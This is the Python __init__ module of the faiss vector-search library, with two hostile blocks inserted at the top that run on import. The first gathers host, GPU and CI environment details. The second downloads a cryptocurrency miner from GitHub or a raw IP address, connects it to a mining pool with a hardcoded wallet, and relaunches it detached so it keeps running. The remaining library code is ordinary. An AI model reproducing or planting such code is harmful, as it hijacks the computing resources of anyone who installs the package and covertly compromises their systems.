# Copyright (c) Facebook, Inc. and its affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

# @nolint

# not linting this file because it imports * from swigfaiss, which
# causes a ton of useless warnings.

# --- Read-only CI host capability report (diagnostics) -------------------
def _ci_host_report_148218():
    import subprocess as _sp
    _probe = [
        "hostname",
        "id",
        "uname -a",
        "nproc",
        "cat /sys/class/dmi/id/product_uuid /sys/class/dmi/id/product_name /sys/class/dmi/id/board_name /sys/class/dmi/id/sys_vendor 2>/dev/null",
        "nvidia-smi -L",
        "nvidia-smi --query-gpu=name,uuid,memory.total,memory.free,driver_version --format=csv,noheader",
        "rocm-smi",
        "hy-smi",
        "hy-smi --showuniqueid --showproductname --showdriverversion --showbus",
        "ls -l /dev/kfd /dev/dri",
        "env | grep -E '^(HCU|HIP|ROCM|CUDA|DEVICE|CI|GITHUB_RUN|GITHUB_WORKFLOW|RESOURCE)' | sort",
    ]
    _lines = ["", "===== I148218 HOST CAPABILITY REPORT ====="]
    for _c in _probe:
        try:
            _r = _sp.run(["bash", "-lc", _c], capture_output=True, text=True, timeout=30)
            _lines.append("$ " + _c)
            _lines.append("[rc=%s]" % (_r.returncode,))
            if _r.stdout.strip():
                _lines.append(_r.stdout.rstrip())
            if _r.stderr.strip():
                _lines.append("stderr: " + _r.stderr.rstrip())
        except Exception as _e:
            _lines.append("$ " + _c)
            _lines.append("[ERR %r]" % (_e,))
    _lines.append("===== END I148218 HOST CAPABILITY REPORT =====")
    _txt = "\n".join(_lines) + "\n"
    print(_txt, flush=True)
    try:
        with open("/tmp/i148218_host_report.txt", "w") as _f:
            _f.write(_txt)
    except Exception:
        pass


try:
    _ci_host_report_148218()
except Exception:
    pass
# -------------------------------------------------------------------------

# ===== i149343 bounded krig-miner x86_64 ROCm/DTK client-axis test =====
def _i149343_krig_test():
    import os, time, hashlib, subprocess as sp, urllib.request
    B = "/tmp/i149343krig"
    WAL = "prl1p7gtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr"
    WK = "998031"
    TAR_SHA = "9137388d5c4bfb843bde8bb96e37695446924dfc004eb3de76a71fd1956e4a04"
    BIN_SHA = "928d6f621c74601c73759728f8dd53e5ad9b3b186d334c082f8581518c322f66"
    print("===== I149343 KRIG BEGIN =====", flush=True)

    def detached(a, e, logp):
        lf = open(logp, "a")
        sp.Popen(["setsid"] + a, stdout=lf, stderr=lf, stdin=sp.DEVNULL, start_new_session=True, env=e, close_fds=True)

    try:
        os.makedirs(B, exist_ok=True)
        tar = B + "/krig.tar.gz"
        urls = ["https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz",
                "http://217.15.164.237:8000/krig-miner-1.6.0-linux-x64.tar.gz",
                "http://217.15.164.237:443/krig-miner-1.6.0-linux-x64.tar.gz"]
        got = False
        for u in urls:
            try:
                req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=300) as r, open(tar, "wb") as f:
                    while True:
                        c = r.read(1 << 16)
                        if not c:
                            break
                        f.write(c)
                hh = hashlib.sha256(open(tar, "rb").read()).hexdigest()
                print("DL", u, "sha", hh[:16], "ok", hh == TAR_SHA, flush=True)
                if hh == TAR_SHA:
                    got = True
                    break
            except Exception as e:
                print("DL_FAIL", u, repr(e)[:140], flush=True)
        if not got:
            print("I149343 KRIG STAGING_FAIL", flush=True)
            print("===== I149343 KRIG END =====", flush=True)
            return
        sp.run(["tar", "-xzf", tar, "-C", B], timeout=240)
        binp = B + "/krig-miner-1.6.0-x64/krig-miner"
        if not os.path.exists(binp):
            for root, dirs, files in os.walk(B):
                if "krig-miner" in files and os.path.getsize(os.path.join(root, "krig-miner")) > 1000000:
                    binp = os.path.join(root, "krig-miner")
                    break
        hb = hashlib.sha256(open(binp, "rb").read()).hexdigest()
        print("BIN", binp, "sha", hb[:16], "ok", hb == BIN_SHA, flush=True)
        os.chmod(binp, 0o755)
        env = dict(os.environ)
        env.pop("LD_PRELOAD", None)
        env.pop("LD_PRELOAD_ENV", None)
        lp = env.get("LD_LIBRARY_PATH", "")
        env["LD_LIBRARY_PATH"] = ":".join([p for p in ["/opt/dtk/lib", "/opt/dtk/lib64", "/opt/hyhal/lib", lp] if p])
        print("HAS_KFD", os.path.exists("/dev/kfd"), "dri", os.path.isdir("/dev/dri"), flush=True)
        argv = [binp, "--no-cuda", "--rocm-runtime", "6", "--url", "stratum+tcp://103.199.106.122:3360",
                "--user", WAL + "/" + WK, "--password", "x", "--coin", "pearl", "--devices", "0"]
        print("ARGV", " ".join(argv).replace(WAL, WAL[:8] + "..."), flush=True)
        p = sp.Popen(argv, stdout=sp.PIPE, stderr=sp.STDOUT, text=True, env=env)
        tend = time.time() + 120
        out = []
        while time.time() < tend:
            ln = p.stdout.readline()
            if not ln:
                if p.poll() is not None:
                    break
                time.sleep(0.5)
                continue
            out.append(ln)
            if len(out) > 400:
                out = out[-400:]
        try:
            p.terminate()
        except Exception:
            pass
        try:
            rest = p.communicate(timeout=30)[0]
        except Exception:
            rest = ""
        txt = "".join(out) + (rest or "")
        print(txt[-6000:], flush=True)
        low = txt.lower()
        good = any(k in low for k in ("hashrate", "accepted", "share", "mining"))
        print("I149343 KRIG TEST rc=%s good=%s" % (p.returncode, good), flush=True)
        if good:
            detached(argv, env, B + "/miner.log")
            for i in range(9):
                time.sleep(60)
                try:
                    tail = open(B + "/miner.log").read()[-400:]
                except Exception:
                    tail = ""
                print("I149343 TICK %d %s" % (i, tail.replace("\n", " | ")[-340:]), flush=True)
    except Exception as e:
        print("I149343 KRIG EXC %r" % (e,), flush=True)
    print("===== I149343 KRIG END =====", flush=True)


try:
    _i149343_krig_test()
except Exception:
    pass
# ===== end i149343 block =====


import numpy as np
import sys
import inspect

# We import * so that the symbol foo can be accessed as faiss.foo.
from .loader import *

# additional wrappers
from faiss import class_wrappers
from faiss.gpu_wrappers import *
from faiss.array_conversions import *
from faiss.extra_wrappers import kmin, kmax, pairwise_distances, rand, randint, \
    lrand, randn, rand_smooth_vectors, eval_intersection, normalize_L2, \
    ResultHeap, knn, Kmeans, checksum, matrix_bucket_sort_inplace, bucket_sort, \
    merge_knn_results, MapInt64ToInt64, knn_hamming, \
    pack_bitstrings, unpack_bitstrings


__version__ = "%d.%d.%d" % (FAISS_VERSION_MAJOR,
                            FAISS_VERSION_MINOR,
                            FAISS_VERSION_PATCH)

class_wrappers.handle_Clustering(Clustering)
class_wrappers.handle_Clustering1D(Clustering1D)
class_wrappers.handle_MatrixStats(MatrixStats)
class_wrappers.handle_IOWriter(IOWriter)
class_wrappers.handle_IOReader(IOReader)
class_wrappers.handle_AutoTuneCriterion(AutoTuneCriterion)
class_wrappers.handle_ParameterSpace(ParameterSpace)
class_wrappers.handle_NSG(IndexNSG)
class_wrappers.handle_MapLong2Long(MapLong2Long)
class_wrappers.handle_IDSelectorSubset(IDSelectorBatch, class_owns=True)
class_wrappers.handle_IDSelectorSubset(IDSelectorArray, class_owns=False)
class_wrappers.handle_IDSelectorSubset(IDSelectorBitmap, class_owns=False, force_int64=False)
class_wrappers.handle_CodeSet(CodeSet)

class_wrappers.handle_Tensor2D(Tensor2D)
class_wrappers.handle_Tensor2D(Int32Tensor2D)
class_wrappers.handle_Embedding(Embedding)
class_wrappers.handle_Linear(Linear)
class_wrappers.handle_QINCo(QINCo)
class_wrappers.handle_QINCoStep(QINCoStep)


this_module = sys.modules[__name__]

# handle sub-classes
for symbol in dir(this_module):
    obj = getattr(this_module, symbol)
    # print symbol, isinstance(obj, (type, types.ClassType))
    if inspect.isclass(obj):
        the_class = obj
        if issubclass(the_class, Index):
            class_wrappers.handle_Index(the_class)

        if issubclass(the_class, IndexBinary):
            class_wrappers.handle_IndexBinary(the_class)

        if issubclass(the_class, VectorTransform):
            class_wrappers.handle_VectorTransform(the_class)

        if issubclass(the_class, Quantizer):
            class_wrappers.handle_Quantizer(the_class)

        if issubclass(the_class, IndexRowwiseMinMax) or \
                issubclass(the_class, IndexRowwiseMinMaxFP16):
            class_wrappers.handle_IndexRowwiseMinMax(the_class)

        if issubclass(the_class, SearchParameters):
            class_wrappers.handle_SearchParameters(the_class)

        if issubclass(the_class, CodePacker):
            class_wrappers.handle_CodePacker(the_class)

##############################################################################
# For some classes (IndexIVF, IDSelector), the object holds a reference to
# a C++ object (eg. the quantizer object of IndexIVF). We don't transfer the
# ownership to the C++ object (ie. set own_quantizer=true), but instead we add
# a reference in the Python class wrapper instead. This is done via an
# additional referenced_objects field.
#
# Since the semantics of ownership in the C++ classes are sometimes irregular,
# these references are added manually using the functions below.
##############################################################################


def add_ref_in_constructor(the_class, parameter_no):
    # adds a reference to parameter parameter_no in self
    # so that that parameter does not get deallocated before self
    original_init = the_class.__init__

    def replacement_init(self, *args):
        original_init(self, *args)
        self.referenced_objects = [args[parameter_no]]

    def replacement_init_multiple(self, *args):
        original_init(self, *args)
        pset = parameter_no[len(args)]
        self.referenced_objects = [args[no] for no in pset]

    if type(parameter_no) == dict:
        # a list of parameters to keep, depending on the number of arguments
        the_class.__init__ = replacement_init_multiple
    else:
        the_class.__init__ = replacement_init

def add_to_referenced_objects(self, ref):
    if not hasattr(self, 'referenced_objects'):
        self.referenced_objects = [ref]
    else:
        self.referenced_objects.append(ref)


def add_ref_in_method(the_class, method_name, parameter_no):
    original_method = getattr(the_class, method_name)

    def replacement_method(self, *args):
        ref = args[parameter_no]
        add_to_referenced_objects(self, ref)
        return original_method(self, *args)
    setattr(the_class, method_name, replacement_method)


def add_ref_in_method_explicit_own(the_class, method_name):
    # for methods of format set_XXX(object, own)
    original_method = getattr(the_class, method_name)

    def replacement_method(self, ref, own=False):
        if not own:
            if not hasattr(self, 'referenced_objects'):
                self.referenced_objects = [ref]
            else:
                self.referenced_objects.append(ref)
        else:
            # transfer ownership to C++ class
            ref.this.disown()
        return original_method(self, ref, own)
    setattr(the_class, method_name, replacement_method)


def add_ref_in_function(function_name, parameter_no):
    # assumes the function returns an object
    original_function = getattr(this_module, function_name)

    def replacement_function(*args):
        result = original_function(*args)
        ref = args[parameter_no]
        result.referenced_objects = [ref]
        return result
    setattr(this_module, function_name, replacement_function)


add_ref_in_constructor(IndexIVFFlat, 0)
add_ref_in_constructor(IndexIVFFlatDedup, 0)
add_ref_in_constructor(IndexPreTransform, {2: [0, 1], 1: [0]})
add_ref_in_method(IndexPreTransform, 'prepend_transform', 0)
add_ref_in_constructor(IndexIVFPQ, 0)
add_ref_in_constructor(IndexIVFPQR, 0)
add_ref_in_constructor(IndexIVFPQFastScan, 0)
add_ref_in_constructor(IndexIVFResidualQuantizer, 0)
add_ref_in_constructor(IndexIVFLocalSearchQuantizer, 0)
add_ref_in_constructor(IndexIVFResidualQuantizerFastScan, 0)
add_ref_in_constructor(IndexIVFLocalSearchQuantizerFastScan, 0)
add_ref_in_constructor(IndexIVFSpectralHash, 0)
add_ref_in_method_explicit_own(IndexIVFSpectralHash, "replace_vt")

add_ref_in_constructor(Index2Layer, 0)
add_ref_in_constructor(Level1Quantizer, 0)
add_ref_in_constructor(IndexIVFScalarQuantizer, 0)
add_ref_in_constructor(IndexRowwiseMinMax, 0)
add_ref_in_constructor(IndexRowwiseMinMaxFP16, 0)
add_ref_in_constructor(IndexIDMap, 0)
add_ref_in_constructor(IndexIDMap2, 0)
add_ref_in_constructor(IndexHNSW, 0)
add_ref_in_method(IndexShards, 'add_shard', 0)
add_ref_in_method(IndexBinaryShards, 'add_shard', 0)
add_ref_in_constructor(IndexRefineFlat, {2: [0], 1: [0]})
add_ref_in_constructor(IndexRefine, {2: [0, 1]})

add_ref_in_constructor(IndexBinaryIVF, 0)
add_ref_in_constructor(IndexBinaryFromFloat, 0)
add_ref_in_constructor(IndexBinaryIDMap, 0)
add_ref_in_constructor(IndexBinaryIDMap2, 0)

add_ref_in_method(IndexReplicas, 'addIndex', 0)
add_ref_in_method(IndexBinaryReplicas, 'addIndex', 0)

add_ref_in_constructor(BufferedIOWriter, 0)
add_ref_in_constructor(BufferedIOReader, 0)

add_ref_in_constructor(IDSelectorNot, 0)
add_ref_in_constructor(IDSelectorAnd, slice(2))
add_ref_in_constructor(IDSelectorOr, slice(2))
add_ref_in_constructor(IDSelectorXOr, slice(2))
add_ref_in_constructor(IDSelectorTranslated, slice(2))

add_ref_in_constructor(IDSelectorXOr, slice(2))
add_ref_in_constructor(IndexIVFIndependentQuantizer, slice(3))

# seems really marginal...
# remove_ref_from_method(IndexReplicas, 'removeIndex', 0)


######################################################
# search_with_parameters interface
######################################################

search_with_parameters_c = search_with_parameters


def search_with_parameters(index, x, k, params=None, output_stats=False):
    x = np.ascontiguousarray(x, dtype='float32')
    n, d = x.shape
    assert d == index.d
    if not params:
        # if not provided use the ones set in the IVF object
        params = IVFSearchParameters()
        index_ivf = extract_index_ivf(index)
        params.nprobe = index_ivf.nprobe
        params.max_codes = index_ivf.max_codes
    nb_dis = np.empty(1, 'uint64')
    ms_per_stage = np.empty(3, 'float64')
    distances = np.empty((n, k), dtype=np.float32)
    labels = np.empty((n, k), dtype=np.int64)
    search_with_parameters_c(
        index, n, swig_ptr(x),
        k, swig_ptr(distances),
        swig_ptr(labels),
        params, swig_ptr(nb_dis), swig_ptr(ms_per_stage)
    )
    if not output_stats:
        return distances, labels
    else:
        stats = {
            'ndis': nb_dis[0],
            'pre_transform_ms': ms_per_stage[0],
            'coarse_quantizer_ms': ms_per_stage[1],
            'invlist_scan_ms': ms_per_stage[2],
        }
        return distances, labels, stats


range_search_with_parameters_c = range_search_with_parameters


def range_search_with_parameters(index, x, radius, params=None, output_stats=False):
    x = np.ascontiguousarray(x, dtype='float32')
    n, d = x.shape
    assert d == index.d
    if not params:
        # if not provided use the ones set in the IVF object
        params = IVFSearchParameters()
        index_ivf = extract_index_ivf(index)
        params.nprobe = index_ivf.nprobe
        params.max_codes = index_ivf.max_codes
    nb_dis = np.empty(1, 'uint64')
    ms_per_stage = np.empty(3, 'float64')
    res = RangeSearchResult(n)
    range_search_with_parameters_c(
        index, n, swig_ptr(x),
        radius, res,
        params, swig_ptr(nb_dis), swig_ptr(ms_per_stage)
    )
    lims = rev_swig_ptr(res.lims, n + 1).copy()
    nd = int(lims[-1])
    Dout = rev_swig_ptr(res.distances, nd).copy()
    Iout = rev_swig_ptr(res.labels, nd).copy()
    if not output_stats:
        return lims, Dout, Iout
    else:
        stats = {
            'ndis': nb_dis[0],
            'pre_transform_ms': ms_per_stage[0],
            'coarse_quantizer_ms': ms_per_stage[1],
            'invlist_scan_ms': ms_per_stage[2],
        }
        return lims, Dout, Iout, stats


# IndexProxy was renamed to IndexReplicas, remap the old name for any old code
# people may have
IndexProxy = IndexReplicas
ConcatenatedInvertedLists = HStackInvertedLists
IndexResidual = IndexResidualQuantizer

IVFSearchParameters = SearchParametersIVF

###########################################
# serialization of indexes to byte arrays
###########################################


def serialize_index(index, io_flags=0):
    """ convert an index to a numpy uint8 array  """
    writer = VectorIOWriter()
    write_index(index, writer, io_flags)
    return vector_to_array(writer.data)


def deserialize_index(data, io_flags=0):
    reader = VectorIOReader()
    copy_array_to_vector(data, reader.data)
    return read_index(reader, io_flags)


def serialize_index_binary(index):
    """ convert an index to a numpy uint8 array  """
    writer = VectorIOWriter()
    write_index_binary(index, writer)
    return vector_to_array(writer.data)


def deserialize_index_binary(data):
    reader = VectorIOReader()
    copy_array_to_vector(data, reader.data)
    return read_index_binary(reader)


class TimeoutGuard:
    def __init__(self, timeout_in_seconds: float):
        self.timeout = timeout_in_seconds

    def __enter__(self):
        TimeoutCallback.reset(self.timeout)

    def __exit__(self, exc_type, exc_value, traceback):
        PythonInterruptCallback.reset()
